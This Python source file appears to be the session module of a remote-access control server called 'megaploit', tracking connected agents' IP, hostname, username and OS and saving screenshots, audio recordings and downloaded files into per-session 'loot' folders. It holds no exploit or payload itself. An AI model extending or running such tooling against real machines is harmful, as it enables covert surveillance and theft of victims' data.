"""
megaploit.server.session
~~~~~~~~~~~~~~~~~~~~~~~~
A Session represents one authenticated agent connection.
It owns the socket and all per-connection counters/state.
"""

from __future__ import annotations

import os
import socket
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional


@dataclass
class Session:
    conn: socket.socket
    ip: str
    port: int
    connected_at: float = field(default_factory=time.time)
    screenshot_count: int = 0
    recording_count: int = 0
    download_count: int = 0
    upload_count: int = 0
    id: int = 0                       # set by Listener

    # ── Operator-assigned metadata ─────────────────────────────────────
    tag: str = ""                     # short label for this session
    notes: str = ""                   # operator free-text notes
    hostname: str = ""                # populated by sysinfo / os_info
    os_name: str = ""                 # e.g. "Windows 10 21H2"
    username: str = ""                # remote username if known

    # ---------------------------------------------------------------
    # Convenience helpers
    # ---------------------------------------------------------------

    @property
    def label(self) -> str:
        if self.tag:
            return f"{self.ip}:{self.port} ({self.tag})"
        return f"{self.ip}:{self.port}"

    @property
    def uptime(self) -> str:
        secs = int(time.time() - self.connected_at)
        h, rem = divmod(secs, 3600)
        m, s = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    def close(self) -> None:
        try:
            self.conn.close()
        except OSError:
            pass

    # ---------------------------------------------------------------
    # Loot directory
    # ---------------------------------------------------------------

    def loot_dir(self) -> str:
        """Return (and create) a per-session loot directory."""
        ts   = datetime.fromtimestamp(self.connected_at, tz=timezone.utc).strftime("%Y%m%d_%H%M%S")
        slug = self.tag.replace(" ", "_") if self.tag else self.ip.replace(".", "_")
        path = os.path.join("loot", f"session_{self.id}_{slug}_{ts}")
        os.makedirs(path, exist_ok=True)
        return path

    # ---------------------------------------------------------------
    # Unique save paths (never overwrite previous files)
    # ---------------------------------------------------------------

    def screenshot_path(self) -> str:
        self.screenshot_count += 1
        os.makedirs("loot/screenshots", exist_ok=True)
        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        return os.path.join(
            "loot", "screenshots",
            f"shot_{self.ip}_{ts}_{self.screenshot_count}.png",
        )

    def recording_path(self) -> str:
        self.recording_count += 1
        os.makedirs("loot/recordings", exist_ok=True)
        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        return os.path.join(
            "loot", "recordings",
            f"rec_{self.ip}_{ts}_{self.recording_count}.wav",
        )

    def download_path(self, remote_name: str) -> str:
        self.download_count += 1
        base = os.path.basename(remote_name)
        os.makedirs("loot/downloads", exist_ok=True)
        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        return os.path.join("loot", "downloads", f"{ts}_{self.download_count}_{base}")

    # ---------------------------------------------------------------
    # Summary dict (for JSON export / loot browser)
    # ---------------------------------------------------------------

    def to_dict(self) -> dict:
        return {
            "id":           self.id,
            "ip":           self.ip,
            "port":         self.port,
            "tag":          self.tag,
            "hostname":     self.hostname,
            "os_name":      self.os_name,
            "username":     self.username,
            "notes":        self.notes,
            "uptime":       self.uptime,
            "connected_at": datetime.fromtimestamp(
                self.connected_at, tz=timezone.utc
            ).isoformat(),
        }
